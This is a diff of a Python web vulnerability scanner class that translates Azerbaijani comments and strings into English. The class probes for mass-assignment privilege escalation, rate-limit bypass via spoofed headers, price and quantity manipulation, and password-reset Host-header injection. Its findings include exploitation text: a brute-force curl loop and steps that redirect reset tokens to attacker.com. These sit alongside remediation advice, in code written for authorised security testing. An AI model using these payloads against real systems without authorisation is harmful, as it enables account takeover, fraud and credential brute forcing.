@@ -26,11 +26,11 @@ class BusinessLogicScanner:
         self, base_url: str
     ) -> list[Vulnerability]:
         """
-        Admin/role parametrləri ilə privilege escalation cəhdi
+        Privilege escalation attempt using admin/role parameters
         """
         vulns = []
 
-        # Ümumi admin endpoint-lər
+        # Common admin endpoints
         admin_paths = [
             "/api/user/update", "/api/profile/update",
             "/api/users/me", "/api/account/update",
@@ -38,7 +38,7 @@ class BusinessLogicScanner:
             "/api/v1/user", "/api/v2/user",
         ]
 
-        # Mass assignment payloadları
+        # Mass assignment payloads
         privesc_payloads = [
             {"role": "admin"},
             {"is_admin": True},
@@ -63,7 +63,7 @@ class BusinessLogicScanner:
                 if not resp:
                     continue
 
-                # 200 OK + response-da admin görsənərsə
+                # 200 OK + admin appears in the response
                 if resp.status_code == 200:
                     body = resp.text.lower()
                     if any(
@@ -77,8 +77,8 @@ class BusinessLogicScanner:
                             cvss_score=9.8,
                             title=f"Mass Assignment / Privilege Escalation — {path}",
                             description=(
-                                f"POST {path} endpoint-i istifadəçinin öz "
-                                f"role/permission-unu dəyişməsinə imkan verir. "
+                                f"The POST {path} endpoint allows a user to change their own "
+                                f"role/permission. "
                                 f"Payload: {json.dumps(payload)}"
                             ),
                             evidence=(
@@ -91,13 +91,13 @@ class BusinessLogicScanner:
                                 f"  -H 'Content-Type: application/json' \\\n"
                                 f"  -H 'Cookie: YOUR_SESSION' \\\n"
                                 f"  -d '{json.dumps(payload)}'\n\n"
-                                f"Sonra /api/users/me ilə rol dəyişdi mi yoxla"
+                                f"Then check /api/users/me to see if the role changed"
                             ),
                             remediation=(
-                                "1. Server-side whitelist — yalnız icazəli sahələri qəbul et\n"
-                                "2. Role/permission-u heç vaxt client-dən qəbul etmə\n"
+                                "1. Server-side whitelist — only accept allowed fields\n"
+                                "2. Never accept role/permission from the client\n"
                                 "3. Mass assignment protection (Laravel: $guarded, Rails: strong params)\n"
-                                "4. DTO pattern istifadə et"
+                                "4. Use the DTO pattern"
                             ),
                             curl_poc=(
                                 f"curl -X POST '{url}' "
@@ -113,7 +113,7 @@ class BusinessLogicScanner:
     async def _check_rate_limit_bypass(
         self, base_url: str
     ) -> list[Vulnerability]:
-        """Auth endpoint-lərindəki rate limit bypass yoxla"""
+        """Check for rate limit bypass on auth endpoints"""
         vulns = []
 
         auth_endpoints = [
@@ -134,7 +134,7 @@ class BusinessLogicScanner:
         for path, payload in auth_endpoints:
             url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
 
-            # Normal 5 request — rate limit var mı?
+            # 5 normal requests — is there a rate limit?
             blocked = False
             for i in range(5):
                 resp = await self.http_client.post(url, json=payload)
@@ -144,9 +144,9 @@ class BusinessLogicScanner:
                 await asyncio.sleep(0.1)
 
             if not blocked:
-                continue  # Rate limit yoxdur — bypass lazım deyil
+                continue  # No rate limit — no need to bypass
 
-            # Rate limit var — bypass cəhdi
+            # There's a rate limit — attempt bypass
             for header_template in bypass_headers:
                 header_key = list(header_template.keys())[0]
                 bypassed = False
@@ -170,16 +170,16 @@ class BusinessLogicScanner:
                         cvss_score=7.5,
                         title=f"Rate Limit Bypass — {header_key} — {path}",
                         description=(
-                            f"{path} endpoint-ində rate limit var, "
-                            f"lakin '{header_key}' header-i dəyişdirərək bypass mümkündür. "
-                            f"Brute force hücumuna imkan yaranır."
+                            f"The {path} endpoint has a rate limit, "
+                            f"but it can be bypassed by changing the '{header_key}' header. "
+                            f"This opens the door to brute-force attacks."
                         ),
                         evidence=(
-                            f"Normal 5 req → 429 alındı\n"
-                            f"{header_key} ilə 5 req → bypass işlədi"
+                            f"Normal 5 req → got 429\n"
+                            f"5 req with {header_key} → bypass worked"
                         ),
                         exploitation=(
-                            f"# Hydra ilə brute force:\n"
+                            f"# Brute force with Hydra:\n"
                             f"for i in $(seq 1 1000); do\n"
                             f"  curl -X POST '{url}' \\\n"
                             f"    -H '{header_key}: 1.2.3.$i' \\\n"
@@ -189,11 +189,11 @@ class BusinessLogicScanner:
                             f"done"
                         ),
                         remediation=(
-                            "1. Rate limit-i IP əvəzinə user/account əsasında tətbiq et\n"
-                            "2. Proxy header-lərini trust etmə\n"
-                            "3. X-Forwarded-For-u yalnız trusted proxy-dən qəbul et\n"
-                            "4. CAPTCHA əlavə et\n"
-                            "5. Account lockout tətbiq et"
+                            "1. Apply the rate limit per user/account instead of by IP\n"
+                            "2. Don't trust proxy headers\n"
+                            "3. Only accept X-Forwarded-For from a trusted proxy\n"
+                            "4. Add a CAPTCHA\n"
+                            "5. Apply account lockout"
                         ),
                         curl_poc=(
                             f"curl -X POST '{url}' "
@@ -221,7 +221,7 @@ class BusinessLogicScanner:
             "/shop/cart",
         ]
 
-        # Mənfi/sıfır qiymət/miqdar
+        # Negative/zero price/quantity
         manipulation_payloads = [
             {"quantity": -1, "price": 1},
             {"quantity": 0, "price": 0},
@@ -246,7 +246,7 @@ class BusinessLogicScanner:
 
                 if resp.status_code == 200:
                     body = resp.text.lower()
-                    # Uğur əlaməti — error yoxdur
+                    # Success indicator — no error
                     if not any(
                         err in body
                         for err in ["error", "invalid", "failed", "rejected", "bad request"]
@@ -258,29 +258,29 @@ class BusinessLogicScanner:
                             cvss_score=8.5,
                             title=f"Price/Quantity Manipulation — {path}",
                             description=(
-                                f"{path} endpoint-i mənfi/sıfır/böyük "
-                                f"dəyərləri validate etmir. "
-                                f"Pulsuz və ya ucuz alış-veriş mümkün ola bilər."
+                                f"The {path} endpoint does not validate negative/zero/"
+                                f"excessively large values. "
+                                f"Free or heavily discounted purchases may be possible."
                             ),
                             evidence=(
                                 f"POST {url}\n"
                                 f"Payload: {json.dumps(payload)}\n"
-                                f"Response: 200 OK, error yoxdur"
+                                f"Response: 200 OK, no error"
                             ),
                             exploitation=(
-                                f"1. Səbətə məhsul əlavə et\n"
-                                f"2. Bu request-i göndər:\n"
+                                f"1. Add a product to the cart\n"
+                                f"2. Send this request:\n"
                                 f"curl -X POST '{url}' \\\n"
                                 f"  -H 'Cookie: YOUR_SESSION' \\\n"
                                 f"  -H 'Content-Type: application/json' \\\n"
                                 f"  -d '{json.dumps(payload)}'\n"
-                                f"3. Checkout prosesini tamamla"
+                                f"3. Complete the checkout process"
                             ),
                             remediation=(
-                                "1. Server-side validation — qiymət/miqdar mənfi ola bilməz\n"
-                                "2. Qiyməti client-dən qəbul etmə — DB-dən götür\n"
-                                "3. Min/max limit tətbiq et\n"
-                                "4. Checkout-da yenidən qiymət hesabla"
+                                "1. Server-side validation — price/quantity cannot be negative\n"
+                                "2. Don't accept price from the client — fetch it from the DB\n"
+                                "3. Apply a min/max limit\n"
+                                "4. Recalculate the price at checkout"
                             ),
                             curl_poc=(
                                 f"curl -X POST '{url}' "
@@ -296,7 +296,7 @@ class BusinessLogicScanner:
     async def _check_account_takeover_vectors(
         self, base_url: str
     ) -> list[Vulnerability]:
-        """Account takeover vektorlarını yoxla"""
+        """Check account takeover vectors"""
         vulns = []
 
         # Password reset endpoint analizi
@@ -310,7 +310,7 @@ class BusinessLogicScanner:
         for path in reset_paths:
             url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
 
-            # Host header injection cəhdi
+            # Host header injection attempt
             resp = await self.http_client.post(
                 url,
                 json={"email": "test@test.com"},
@@ -325,11 +325,11 @@ class BusinessLogicScanner:
                     url=url,
                     severity=Severity.HIGH,
                     cvss_score=8.0,
-                    title=f"Password Reset — Host Header Injection Potensialı — {path}",
+                    title=f"Password Reset — Potential Host Header Injection — {path}",
                     description=(
-                        f"Password reset endpoint-i Host header-ə görə "
-                        f"reset link yaradırsa, attacker öz domain-inə "
-                        f"reset token-i yönləndirə bilər."
+                        f"If the password reset endpoint builds the reset link from "
+                        f"the Host header, an attacker can redirect the "
+                        f"reset token to their own domain."
                     ),
                     evidence=(
                         f"POST {url}\n"
@@ -337,18 +337,18 @@ class BusinessLogicScanner:
                         f"Response: {resp.status_code}"
                     ),
                     exploitation=(
-                        f"1. Victim-in emailini bil\n"
-                        f"2. Bu request-i göndər:\n"
+                        f"1. Know the victim's email\n"
+                        f"2. Send this request:\n"
                         f"curl -X POST '{url}' \\\n"
                         f"  -H 'Host: attacker.com' \\\n"
                         f"  -H 'Content-Type: application/json' \\\n"
                         f"  -d '{{\"email\":\"victim@target.com\"}}'\n"
-                        f"3. Reset email-i attacker.com domain-inə göndərilər\n"
-                        f"4. Token-i al, şifrəni dəyiş"
+                        f"3. The reset email will be sent pointing to the attacker.com domain\n"
+                        f"4. Grab the token and change the password"
                     ),
                     remediation=(
-                        "1. Reset URL-i config-dən al — Host header-dən deyil\n"
-                        "2. Allowed host whitelist tətbiq et\n"
+                        "1. Build the reset URL from config — not from the Host header\n"
+                        "2. Apply an allowed-host whitelist\n"
                         "3. Django: ALLOWED_HOSTS, Rails: config.hosts"
                     ),
                     curl_poc=(
@@ -366,12 +366,12 @@ class BusinessLogicScanner:
         self, base_url: str
     ) -> list[Vulnerability]:
         """
-        Response-based auth bypass — false/true dəyişdirmə
+        Response-based auth bypass — flipping false/true
         """
         vulns = []
 
-        # Bu yoxlama manual Burp Suite ilə daha effektivdir
-        # Avtomatik aşkar etmək üçün hint verək
+        # This check is more effective done manually with Burp Suite
+        # Let's give a hint for automated detection
 
         check_paths = [
             "/api/admin", "/api/admin/users",
@@ -385,7 +385,7 @@ class BusinessLogicScanner:
             if not resp:
                 continue
 
-            # 401/403 qaytarır amma JSON body-si admin datası var?
+            # Returns 401/403 but the JSON body has admin data?
             if resp.status_code in [401, 403]:
                 try:
                     data = resp.json()
@@ -401,9 +401,9 @@ class BusinessLogicScanner:
                             cvss_score=7.5,
                             title=f"Data Leak in Error Response — {path}",
                             description=(
-                                f"Endpoint {resp.status_code} qaytarır "
-                                f"lakin response body-sində həssas məlumat var. "
-                                f"Authorization yalnız UI-da tətbiq olunub."
+                                f"The endpoint returns {resp.status_code} "
+                                f"but the response body contains sensitive data. "
+                                f"Authorization appears to be enforced only in the UI."
                             ),
                             evidence=(
                                 f"HTTP {resp.status_code}\n"
@@ -411,13 +411,13 @@ class BusinessLogicScanner:
                             ),
                             exploitation=(
                                 f"curl -s '{url}' — "
-                                f"{resp.status_code} olsa da data görünür.\n"
-                                f"Burp Suite ilə intercept edib status 200-ə dəyiş."
+                                f"data is visible even though the status is {resp.status_code}.\n"
+                                f"Intercept with Burp Suite and change the status to 200."
                             ),
                             remediation=(
-                                "1. Server-side authorization — yalnız frontend-də etmə\n"
-                                "2. Error response-da data return etmə\n"
-                                "3. Middleware-lə bütün endpoint-ləri qoru"
+                                "1. Enforce authorization server-side — not only on the frontend\n"
+                                "2. Don't return data in error responses\n"
+                                "3. Protect all endpoints with middleware"
                             ),
                             curl_poc=f"curl -s '{url}'",
                             cwe_id="CWE-284",
